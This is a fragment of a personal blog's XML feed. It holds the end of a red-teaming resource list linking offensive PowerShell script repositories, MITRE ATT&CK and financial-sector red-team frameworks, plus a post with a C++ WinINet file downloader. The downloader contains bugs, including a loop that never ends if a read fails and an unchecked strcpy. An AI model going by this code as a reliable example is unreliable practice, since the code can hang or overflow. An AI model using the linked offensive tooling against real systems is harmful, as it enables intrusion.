href="https://github.com/FuzzySecurity/PowerShell-Suite" target="_blank" rel="noopener">https://github.com/FuzzySecurity/PowerShell-Suite</a></li><li><a href="https://github.com/nettitude/Powershell" target="_blank" rel="noopener">https://github.com/nettitude/Powershell</a></li><li><a href="https://github.com/Mr-Un1k0d3r/RedTeamPowershellScripts" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/RedTeamPowershellScripts</a></li><li><a href="https://github.com/threatexpress/red-team-scripts" target="_blank" rel="noopener">https://github.com/threatexpress/red-team-scripts</a></li><li><a href="https://github.com/SadProcessor/SomeStuff" target="_blank" rel="noopener">https://github.com/SadProcessor/SomeStuff</a></li><li><a href="https://github.com/rvrsh3ll/Misc-Powershell-Scripts" target="_blank" rel="noopener">https://github.com/rvrsh3ll/Misc-Powershell-Scripts</a></li><li><a href="https://github.com/enigma0x3/Misc-PowerShell-Stuff" target="_blank" rel="noopener">https://github.com/enigma0x3/Misc-PowerShell-Stuff</a></li><li><a href="https://github.com/ChrisTruncer/PenTestScripts" target="_blank" rel="noopener">https://github.com/ChrisTruncer/PenTestScripts</a></li><li><a href="https://github.com/bluscreenofjeff/Scripts" target="_blank" rel="noopener">https://github.com/bluscreenofjeff/Scripts</a></li><li><a href="https://github.com/xorrior/RandomPS-Scripts" target="_blank" rel="noopener">https://github.com/xorrior/RandomPS-Scripts</a></li><li><a href="https://github.com/xorrior/Random-CSharpTools" target="_blank" rel="noopener">https://github.com/xorrior/Random-CSharpTools</a></li><li><a href="https://github.com/leechristensen/Random" target="_blank" rel="noopener">https://github.com/leechristensen/Random</a></li><li><a href="https://github.com/mgeeky/Penetration-Testing-Tools/tree/master/social-engineering" target="_blank" rel="noopener">https://github.com/mgeeky/Penetration-Testing-Tools/tree/master/social-engineering</a></li></ul></li></ul><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><strong>MITRE’s ATT&amp;CK™</strong> is a curated knowledge base and model for cyber adversary behavior, reflecting the various phases of an adversary’s lifecycle and the platforms they are known to target. <a href="https://attack.mitre.org/wiki/Main_Page" target="_blank" rel="noopener">https://attack.mitre.org/wiki/Main_Page</a></li><li><strong>Cheat Sheets</strong> for various projects (Beacon/Cobalt Strike,PowerView, PowerUp, Empire, and PowerSploit). <a href="https://github.com/HarmJ0y/CheatSheets" target="_blank" rel="noopener">https://github.com/HarmJ0y/CheatSheets</a></li><li><strong>PRE-ATT&amp;CK</strong> Adversarial Tactics, Techniques &amp; Common Knowledge for Left-of-Exploit. <a href="https://attack.mitre.org/pre-attack/index.php/Main_Page" target="_blank" rel="noopener">https://attack.mitre.org/pre-attack/index.php/Main_Page</a></li><li><strong>Adversary OPSEC</strong> consists of the use of various technologies or 3rd party services to obfuscate, hide, or blend in with accepted network traffic or system behavior. <a href="https://attack.mitre.org/pre-attack/index.php/Adversary_OPSEC" target="_blank" rel="noopener">https://attack.mitre.org/pre-attack/index.php/Adversary_OPSEC</a></li><li><strong>Adversary Emulation Plans</strong> To showcase the practical use of ATT&amp;CK for offensive operators and defenders, MITRE created Adversary Emulation Plans. <a href="https://attack.mitre.org/wiki/Adversary_Emulation_Plans" target="_blank" rel="noopener">https://attack.mitre.org/wiki/Adversary_Emulation_Plans</a></li><li><strong>Red-Team-Infrastructure-Wiki</strong> Wiki to collect Red Team infrastructure hardening resources. <a href="https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki" target="_blank" rel="noopener">https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki</a></li><li><strong>Advanced Threat Tactics – Course and Notes</strong> This is a course on red team operations and adversary simulations. <a href="https://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes" target="_blank" rel="noopener">https://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes</a></li><li><strong>Red Team Tips</strong> as posted by @vysecurity on Twitter. <a href="https://vincentyiu.co.uk/red-team-tips" target="_blank" rel="noopener">https://vincentyiu.co.uk/red-team-tips</a></li><li><strong>Awesome Red Teaming</strong> List of Awesome Red Team / Red Teaming Resources. <a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming" target="_blank" rel="noopener">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a></li><li><strong>ATT&amp;CK for Enterprise Software</strong> is a generic term for custom or commercial code, operating system utilities, open-source software, or other tools used to conduct behavior modeled in ATT&amp;CK. <a href="https://attack.mitre.org/wiki/Software" target="_blank" rel="noopener">https://attack.mitre.org/wiki/Software</a></li><li><strong>Planning a Red Team exercise</strong> This document helps inform red team planning by contrasting against the very specific red team style described in Red Teams. <a href="https://github.com/magoo/redteam-plan" target="_blank" rel="noopener">https://github.com/magoo/redteam-plan</a></li><li><strong>Awesome Lockpicking</strong> a curated list of awesome guides, tools, and other resources related to the security and compromise of locks, safes, and keys. <a href="https://github.com/meitar/awesome-lockpicking" target="_blank" rel="noopener">https://github.com/meitar/awesome-lockpicking</a></li><li><strong>Awesome Threat Intelligence</strong> a curated list of awesome Threat Intelligence resources. <a href="https://github.com/hslatman/awesome-threat-intelligence" target="_blank" rel="noopener">https://github.com/hslatman/awesome-threat-intelligence</a></li><li><strong>APT Notes</strong> Need some scenario? APTnotes is a repository of publicly-available papers and blogs (sorted by year) related to malicious campaigns/activity/software that have been associated with vendor-defined APT (Advanced Persistent Threat) groups and/or tool-sets. <a href="https://github.com/aptnotes/data" target="_blank" rel="noopener">https://github.com/aptnotes/data</a></li><li><strong>TIBER-EU FRAMEWORK</strong> The European Framework for Threat Intelligence-based Ethical Red Teaming (TIBER-EU), which is the first Europe-wide framework for controlled and bespoke tests against cyber attacks in the financial market. <a href="http://www.ecb.europa.eu/pub/pdf/other/ecb.tiber_eu_framework.en.pdf" target="_blank" rel="noopener">http://www.ecb.europa.eu/pub/pdf/other/ecb.tiber_eu_framework.en.pdf</a></li><li><strong>CBEST Implementation Guide</strong> CBEST is a framework to deliver controlled, bespoke, intelligence-led cyber security tests. The tests replicate behaviours of threat actors, assessed by the UK Government and commercial intelligence providers as posing a genuine threat to systemically important financial institutions.<br><a href="https://www.crest-approved.org/wp-content/uploads/2014/07/CBEST-Implementation-Guide.pdf" target="_blank" rel="noopener">https://www.crest-approved.org/wp-content/uploads/2014/07/CBEST-Implementation-Guide.pdf</a></li><li><strong>Red Team: Adversarial Attack Simulation Exercise Guidelines for the Financial Industry in Singapore</strong> The Association of Banks in Singapore (ABS), with support from the Monetary Authority of Singapore (MAS), has developed a set of cybersecurity assessment guidelines today to strengthen the cyber resilience of the financial sector in Singapore. Known as the Adversarial Attack Simulation Exercises (AASE) Guidelines or “Red Teaming” Guidelines, the Guidelines provide financial institutions (FIs) with best practices and guidance on planning and conducting Red Teaming exercises to enhance their security testing.<br><a href="https://abs.org.sg/docs/library/abs-red-team-adversarial-attack-simulation-exercises-guidelines-v1-06766a69f299c69658b7dff00006ed795.pdf" target="_blank" rel="noopener">https://abs.org.sg/docs/library/abs-red-team-adversarial-attack-simulation-exercises-guidelines-v1-06766a69f299c69658b7dff00006ed795.pdf</a></li></ul><h2 id="License"><a href="#License" class="headerlink" title="License"></a>License</h2><p><a href="https://www.gnu.org/licenses/gpl-3.0" target="_blank" rel="noopener"><img src="https://img.shields.io/badge/License-GPL%20v3-blue.svg" alt="License: GPL v3"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/uploads/bBQ9aKm.png&quot; alt=&quot;alt text&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Tools" scheme="https://yaalonsong.github.io/categories/Tools/"/>
    
    
      <category term="Tools" scheme="https://yaalonsong.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>wininet_downloader_cpp</title>
    <link href="https://yaalonsong.github.io/2019/02/28/wininet_downloader_cpp.html"/>
    <id>https://yaalonsong.github.io/2019/02/28/wininet_downloader_cpp.html</id>
    <published>2019-02-28T09:49:30.396Z</published>
    <updated>2019-02-28T13:17:19.193Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>wininet.lib  cpp 下载</p></blockquote><a id="more"></a><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wininet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"wininet.lib"</span>)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  DOWNHELPER_AGENTNAME         <span class="meta-string">"downloader"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  LEN_OF_BUFFER_FOR_QUERYINFO  128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  DOWNLOAD_BUF_SIZE            (10*1024)  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  MAX_DOWNLOAD_REQUEST_TIME    10  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  MAX_DOWNLOAD_BYTESIZE        (10000*1024*1024)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">BOOL _TryHttpSendRequest(LPVOID hRequest, <span class="keyword">int</span> nMaxTryTimes); </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">DownloadUrl</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> strUrl, <span class="built_in">std</span>::<span class="built_in">string</span> strFileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line">    <span class="keyword">if</span> (strUrl == <span class="string">""</span> || strFileName == <span class="string">""</span>)</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"> </span><br><span class="line">   </span><br><span class="line">    HINTERNET hInet = <span class="literal">NULL</span>; </span><br><span class="line">    HINTERNET hConnect = <span class="literal">NULL</span>; </span><br><span class="line">    HINTERNET hRequestHead = <span class="literal">NULL</span>; </span><br><span class="line">    HINTERNET hRequestGet = <span class="literal">NULL</span>; </span><br><span class="line">    HANDLE hFileWrite = <span class="literal">NULL</span>; </span><br><span class="line">    <span class="keyword">char</span>* pBuf = <span class="literal">NULL</span>; </span><br><span class="line">    DWORD dwRequestTryTimes = MAX_DOWNLOAD_REQUEST_TIME;</span><br><span class="line">    DWORD dwDownBytes = <span class="number">0</span>; </span><br><span class="line">    DWORD dwDownFileTotalBytes = <span class="number">0</span>; </span><br><span class="line">    DWORD dwWriteBytes = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">char</span> bufQueryInfo[LEN_OF_BUFFER_FOR_QUERYINFO] = &#123;<span class="number">0</span>&#125;; </span><br><span class="line">    DWORD dwBufQueryInfoSize = <span class="keyword">sizeof</span>(bufQueryInfo);</span><br><span class="line">    DWORD dwStatusCode = <span class="number">0</span>;</span><br><span class="line">    DWORD dwContentLen = <span class="number">0</span>;</span><br><span class="line">    DWORD dwSizeDW = <span class="keyword">sizeof</span>(DWORD);</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">    CHAR pszHostName[INTERNET_MAX_HOST_NAME_LENGTH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    CHAR pszUserName[INTERNET_MAX_USER_NAME_LENGTH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    CHAR pszPassword[INTERNET_MAX_PASSWORD_LENGTH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    CHAR pszURLPath[INTERNET_MAX_URL_LENGTH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    CHAR szURL[INTERNET_MAX_URL_LENGTH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    URL_COMPONENTSA urlComponents = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    urlComponents.dwStructSize = <span class="keyword">sizeof</span>(URL_COMPONENTSA);</span><br><span class="line">    urlComponents.lpszHostName = pszHostName;</span><br><span class="line">    urlComponents.dwHostNameLength = INTERNET_MAX_HOST_NAME_LENGTH;</span><br><span class="line">    urlComponents.lpszUserName = pszUserName;</span><br><span class="line">    urlComponents.dwUserNameLength = INTERNET_MAX_USER_NAME_LENGTH;</span><br><span class="line">    urlComponents.lpszPassword = pszPassword;</span><br><span class="line">    urlComponents.dwPasswordLength = INTERNET_MAX_PASSWORD_LENGTH;</span><br><span class="line">    urlComponents.lpszUrlPath = pszURLPath;</span><br><span class="line">    urlComponents.dwUrlPathLength = INTERNET_MAX_URL_LENGTH;</span><br><span class="line"> </span><br><span class="line">    bRet = InternetCrackUrlA(strUrl.c_str(), <span class="number">0</span>, <span class="literal">NULL</span>, &amp;urlComponents);</span><br><span class="line">    bRet = (bRet &amp;&amp; urlComponents.nScheme == INTERNET_SERVICE_HTTP);</span><br><span class="line">    <span class="keyword">if</span> (!bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> _END_OF_DOWNLOADURL;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    hInet = InternetOpenA(DOWNHELPER_AGENTNAME, INTERNET_OPEN_TYPE_PRECONFIG, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hInet)</span><br><span class="line">    &#123;</span><br><span class="line">        bRet = FALSE;</span><br><span class="line">        <span class="keyword">goto</span> _END_OF_DOWNLOADURL;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    hConnect = InternetConnectA(hInet, pszHostName, urlComponents.nPort, pszUserName, pszPassword, INTERNET_SERVICE_HTTP, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hConnect)</span><br><span class="line">    &#123;</span><br><span class="line">        bRet = FALSE;</span><br><span class="line">        <span class="keyword">goto</span> _END_OF_DOWNLOADURL;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (urlComponents.dwUrlPathLength !=  <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">strcpy</span>(szURL, urlComponents.lpszUrlPath);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">strcpy</span>(szURL, <span class="string">"/"</span>);</span><br><span class="line">    </span><br><span class="line">    hRequestHead = HttpOpenRequestA(hConnect, <span class="string">"HEAD"</span>, szURL, <span class="string">"HTTP/1.1"</span>, <span class="string">""</span>, <span class="literal">NULL</span>, INTERNET_FLAG_RELOAD, <span class="number">0</span>);</span><br><span class="line">    bRet = _TryHttpSendRequest(hRequestHead, dwRequestTryTimes);</span><br><span class="line">    <span class="keyword">if</span> (!bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> _END_OF_DOWNLOADURL; </span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">    dwContentLen = <span class="number">0</span>;</span><br><span class="line">    dwSizeDW = <span class="keyword">sizeof</span>(DWORD);</span><br><span class="line">    bRet = HttpQueryInfo(hRequestHead, HTTP_QUERY_FLAG_NUMBER | HTTP_QUERY_CONTENT_LENGTH, &amp;dwContentLen, &amp;dwSizeDW, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (bRet)</span><br><span class="line">    &#123;</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">if</span> (dwContentLen &gt; MAX_DOWNLOAD_BYTESIZE)</span><br><span class="line">        &#123;</span><br><span class="line">            bRet = FALSE;</span><br><span class="line">            <span class="keyword">goto</span> _END_OF_DOWNLOADURL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">    hRequestGet = HttpOpenRequestA(hConnect, <span class="string">"GET"</span>, szURL, <span class="string">"HTTP/1.1"</span>, <span class="string">""</span>, <span class="literal">NULL</span>, INTERNET_FLAG_RELOAD, <span class="number">0</span>);</span><br><span class="line">    bRet = _TryHttpSendRequest(hRequestGet, dwRequestTryTimes);</span><br><span class="line">    <span class="keyword">if</span> (!bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> _END_OF_DOWNLOADURL; </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">    hFileWrite = CreateFileA(strFileName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, <span class="literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (INVALID_HANDLE_VALUE == hFileWrite)</span><br><span class="line">    &#123;</span><br><span class="line">        bRet = FALSE;</span><br><span class="line">        <span class="keyword">goto</span> _END_OF_DOWNLOADURL;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">    pBuf = <span class="keyword">new</span> <span class="keyword">char</span>[DOWNLOAD_BUF_SIZE]; </span><br><span class="line">    <span class="keyword">if</span> (!pBuf)</span><br><span class="line">    &#123;</span><br><span class="line">        bRet = FALSE;</span><br><span class="line">        <span class="keyword">goto</span> _END_OF_DOWNLOADURL;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">    dwDownFileTotalBytes = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dwDownBytes = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(pBuf, <span class="number">0</span>, DOWNLOAD_BUF_SIZE*<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">        bRet = InternetReadFile(hRequestGet, pBuf, DOWNLOAD_BUF_SIZE, &amp;dwDownBytes);</span><br><span class="line">        <span class="keyword">if</span> (bRet)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (dwDownBytes &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                dwDownFileTotalBytes += dwDownBytes;</span><br><span class="line">                bRet = WriteFile(hFileWrite, pBuf, dwDownBytes, &amp;dwWriteBytes, <span class="literal">NULL</span>); </span><br><span class="line">                <span class="keyword">if</span> (!bRet)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">goto</span> _END_OF_DOWNLOADURL;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == dwDownBytes)</span><br><span class="line">            &#123;</span><br><span class="line">                bRet = TRUE;</span><br><span class="line">                <span class="keyword">break</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"> </span><br><span class="line">_END_OF_DOWNLOADURL:</span><br><span class="line">    <span class="keyword">if</span> (INVALID_HANDLE_VALUE != hFileWrite)</span><br><span class="line">        CloseHandle(hFileWrite);</span><br><span class="line">    <span class="keyword">if</span> (pBuf)</span><br><span class="line">        <span class="keyword">delete</span> [] pBuf;</span><br><span class="line">    <span class="keyword">if</span> (hRequestGet)</span><br><span class="line">        InternetCloseHandle(hRequestGet);</span><br><span class="line">    <span class="keyword">if</span> (hRequestHead)</span><br><span class="line">        InternetCloseHandle(hRequestHead);</span><br><span class="line">    <span class="keyword">if</span> (hConnect)</span><br><span class="line">        InternetCloseHandle(hConnect);</span><br><span class="line">    <span class="keyword">if</span> (hInet)</span><br><span class="line">        InternetCloseHandle(hInet);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">BOOL _TryHttpSendRequest(LPVOID hRequest, <span class="keyword">int</span> nMaxTryTimes)</span><br><span class="line">&#123;</span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line">    DWORD dwStatusCode = <span class="number">0</span>;</span><br><span class="line">    DWORD dwSizeDW = <span class="keyword">sizeof</span>(DWORD);</span><br><span class="line">    <span class="keyword">while</span> (hRequest &amp;&amp; (nMaxTryTimes-- &gt; <span class="number">0</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">       </span><br><span class="line">        bRet = HttpSendRequestA(hRequest, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (!bRet)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            </span><br><span class="line">            dwStatusCode = <span class="number">0</span>;</span><br><span class="line">            dwSizeDW = <span class="keyword">sizeof</span>(DWORD);</span><br><span class="line">            bRet = HttpQueryInfo(hRequest, HTTP_QUERY_FLAG_NUMBER | HTTP_QUERY_STATUS_CODE, &amp;dwStatusCode, &amp;dwSizeDW, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">if</span> (bRet)</span><br><span class="line">            &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> (HTTP_STATUS_OK == dwStatusCode) </span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    bRet = FALSE;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt; <span class="string">"pls input downloadurl:"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> str[<span class="number">80</span>];</span><br><span class="line"><span class="built_in">cin</span>.get(str,<span class="number">80</span>);</span><br><span class="line">    </span><br><span class="line">BOOL bR = DownloadUrl(str, <span class="string">"temp.png"</span>); </span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"Downloading..."</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">if</span> (bR)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"ok"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"no"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;wininet.lib  cpp 下载&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="code" scheme="https://yaalonsong.github.io/categories/code/"/>
    
    
      <category term="code" scheme="https://yaalonsong.github.io/tags/code/"/>
    
  </entry>
  
  <entry>
    <title>Red Teaming Tools</title>
    <link href="https://yaalonsong.github.io/2019/02/28/Awesome%20Red%20Teaming.html"/>
    <id>https://yaalonsong.github.io/2019/02/28/Awesome Red Teaming.html</id>
    <published>2019-02-28T09:49:30.380Z</published>
    <updated>2019-02-28T14:44:39.779Z</updated>
    
